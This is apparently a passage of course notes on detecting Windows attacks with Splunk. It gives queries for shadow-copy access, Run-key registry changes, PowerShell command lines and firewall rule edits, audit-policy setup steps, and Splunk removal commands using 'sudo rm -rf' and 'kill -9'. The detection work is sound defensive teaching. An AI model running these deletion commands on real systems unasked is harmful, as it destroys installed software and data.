+Object_Name="\\Device\\HarddiskVolumeShadowCopy*") NOT (Object_Name="*:Zone.Identifier" OR
+Object_Name="*.part*") | stats count values(Object_Name), values(Accesses) by Security_ID | where count > 1000
+-----------------------------------------------------------------------  
+ 
+ 
+MONITOR FOR REGISTRY CHANGES – 4657::
+-------------------------------------
+1. Monitor for Registry Changes: Adding auditing to known exploited registry keys is a great way to catch malicious
+activity. Registry keys should not change very often unless something is installed or updated. The goal is to look
+for NEW items and changes to known high risk items like the Run and RunOnce keys.
+ 
+
+SAMPLE QUERY:
+---------------------------Type This-----------------------------------
+index=wineventlog LogName=Security (EventCode=4657) Object_Name="*\\Run*" | table _time, host, Security_ID,
+Account_Name, Account_Domain, Operation_Type, Object_Name, Object_Value_Name, Process_Name, New_Value
+-----------------------------------------------------------------------  
+ 
+
+MONITOR FOR WINDOWS POWERSHELL COMMAND LINE - 501::
+---------------------------------------------------
+1. Monitor for PowerShell Command Execution: Hackers will often use PowerShell to exploit a system due to the
+capability of PowerShell to avoid using built-in utilities and drop additional malware on disk. Monitoring the
+PowerShell command lines that are executed can catching potentially malicious behavior. PowerShell logs have
+some odd formatting, the sample below shows a unique non-RegEx way to parse odd logs using the Splunk "split”
+command. PowerShell logs are the worst as far as using the "split” command. These logs are not in the standard
+Windows logs and will need to be added to your Splunk inputs.conf file in order to collect them. The "Windows
+PowerShell” logs may be found under:
+
+ 
+Applications and Services Logs - Windows PowerShell
+---------------------------Type This-----------------------------------
+index=powershell LogName="Windows Powershell" (EventCode=500) | eval MessageA=split(Message,"Details:") | Eval
+Short_Message=mvindex(MessageA,0) | Eval MessageB=mvindex(MessageA,1) | eval MessageB = replace
+(MessageB,"[\n\r]","!") | eval MessageC=split(MessageB,"!!!!") | Eval Message1=mvindex(MessageC,0) | Eval
+Message2=mvindex(MessageC,1) | Eval Message3=mvindex(MessageC,2) | eval MessageD=split(Message3,"!!") | Eval
+Message4=mvindex(MessageD,3) | eval Message4=split(Message4,"=") | eval PS_Version=mvindex(Message4,1) | Eval
+Message5=mvindex(MessageD,4) | Eval Message6=mvindex(MessageD,5) | Eval Message7=mvindex(MessageD,6) |
+eval Message7=split(Message7,"=") | eval Command_Name=mvindex(Message7,1) | Eval
+Message8=mvindex(MessageD,7) | eval Message8=split(Message8,"=") | eval Command_Type=mvindex(Message8,1) |
+Eval Message9=mvindex(MessageD,8) | eval Message9=split(Message9,"=") | eval
+Script_Name=mvindex(Message9,1)| Eval Message10=mvindex(MessageD,9) | eval Message10=split(Message10,"=") |
+eval Command_Path=mvindex(Message10,1) | Eval Message11=mvindex(MessageD,10) | eval
+Message11=split(Message11,"=") | eval Command_Line=mvindex(Message11,1) | table _time EventCode,
+Short_Message, PS_Version, Command_Name, Command_Type, Script_Name, Command_Path, Command_Line
+-----------------------------------------------------------------------  
+
+ 
+MONITOR FOR WINDOWS FIREWALL CHANGES – 2004 & 2005::
+----------------------------------------------------
+1. Monitor for Additions to Firewall Rules: Malware and hackers will often add a firewall rule to allow access to some
+Windows service or application. These logs are not in the standard Windows logs and will need to be added to
+your Splunk inputs.conf file in order to collect them. The Windows firewall logs may be found under:
+ 
+Applications and Services Logs – Microsoft - Windows – Windows Firewall with Advanced Security - Firewall
+---------------------------Type This-----------------------------------
+index=wineventlog LogName=Security EventCode=2004 | table _time, host, Rule_Name, Origin, Active, Direction, Profiles,
+Action, Application_Path, Service_Name, Protocol, Security_Options, Edge_Traversal, Modifying_User,
+Modifying_Application, Rule_ID
+-----------------------------------------------------------------------   
+
+2. Monitor for Changes to Firewall Rules: Malware and hackers will often modify a firewall rule to allow access to
+some Windows service or application. These logs are not in the standard Windows logs and will need to be added
+to your Splunk inputs.conf file in order to collect them.
+---------------------------Type This-----------------------------------
+index=wineventlog LogName=Security EventCode=2005 | table _time, host, Rule_Name, Origin, Active, Direction, Profiles,
+Action, Application_Path, Service_Name, Protocol, Security_Options, Edge_Traversal, Modifying_User,
+Modifying_Application, Rule_ID
+-----------------------------------------------------------------------  
+ 
+ 
+###############################################
+# Why are so many attacks not being detected? #
+###############################################
+By default Windows doesn't log very much. You'll need to modify the Local Security Policy (since we are not connected to Active Directory in which case you would use a GPO) to enable verbose logging.
+ 
+In Server 2003:
+To see the options you have for security auditing and logging and to enable or disable them, go to Control Panel -> Administrative Tools -> Local Security Policy. Once the Local Security Settings console window opens, click on Local Policies then Audit Policy. You will see the following policies that you can enable auditing of successful or failed attempts or disable logging altogether:
+ 
+Audit Account Logon Events
+Audit Account Management
+Audit Director Service Access
+Audit Logon Events
+Audit Object Access
+Audit Policy Change
+Audit Privilege Use
+Audit Process Tracking
+Audit System Events
+ 
+ 
+In Windows 7:
+Click Start and type secpol.msc, then hit Enter, the Local Security Policy window will be displayed, now navigate to Local Policy > Audit Policy. You will see the following policies that you can enable auditing of successful or failed attempts or disable logging altogether:
+ 
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                            #############################################
+----------- ############### # Day 2: Attacking Servers and Workstations # ############### -----------
+                            #############################################
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                            ##############################
+----------- ############### # Day 3: Hunting with Splunk # ############### -----------
+                            ##############################
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+#################
+# Remove Splunk #
+#################
+Reference:
+http://docs.splunk.com/Documentation/Splunk/6.5.1/Installation/UninstallSplunk
+ 
+cd /opt/splunk/bin/
+ 
+sudo ./splunk disable boot-start
+ 
+sudo ./splunk stop
+ 
+sudo kill -9 `ps -ef | grep splunk | grep -v grep | awk '{print $2;}'`
+ 
+cd ~
+ 
+sudo rm -rf /opt/splunk
+ 
+sudo rm -rf /opt/splunkdata
+ 
+sudo userdel splunk
+ 
+sudo groupdel splunk
+
